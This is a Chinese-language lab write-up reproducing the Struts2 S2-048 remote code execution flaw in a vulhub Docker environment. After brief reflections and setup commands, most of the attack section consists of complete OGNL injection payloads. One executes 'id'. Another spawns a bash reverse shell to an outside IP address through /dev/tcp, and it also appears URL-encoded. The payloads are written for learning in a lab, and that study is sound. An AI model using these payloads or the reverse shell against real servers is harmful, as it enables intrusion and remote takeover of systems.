ailx10说：这篇是我2024年9月写的。刷到 S2-048，这次得先确认环境真的启用了 Struts1 插件。输入进入错误消息以后，又被拿去求值，我先用命令输出验证，再继续试连接。过程中出现超时，但后面的动作仍然发生，让我又记了一次“页面没正常结束”和“服务端什么都没做”不能画等号。这篇主要留下插件、错误消息和表达式之间的联系；如果把前提都删掉，只剩一个载荷，读起来当然短，却解释不了为什么别的环境不一定有同样的结果。

---

本文记录 S2-048 的历史实验：启用 Struts1 插件时，不可信数据进入错误消息处理并可能参与后续表达式求值。

具体插件与错误消息处理是必要背景，不能泛化为所有 Struts 错误页；请求和结果尚未重跑。

前提：准备好docker环境，下载好vulhub，进入目录 ，开始复现漏洞

- `docker-compose build//可选`
- `docker-compose up -d`

完成试验后，记得删除漏洞环境哦～～

- `docker-compose down`

简单访问一下，说明 Struts2 S2-048 远程代码执行漏洞 环境搭建成功了

![](/notes-assets/e2bf1741f7094d97da33.webp)

（1）命令执行

```
%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream())).(#q)}
```

![](/notes-assets/c03e964ef08d751021e2.webp)

（2）反弹shell

这里需要使用反弹shell的语句如下，测试了其他的一些反弹shell语句不好使：

```
/bin/bash -c bash$IFS$9-i>&/dev/tcp/144.34.162.13/6666<&1
```

最终载荷URL编码如下：

```
%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('/bin/bash -c bash$IFS$9-i>&/dev/tcp/144.34.162.13/6666<&1').getInputStream())).(#q)}
```
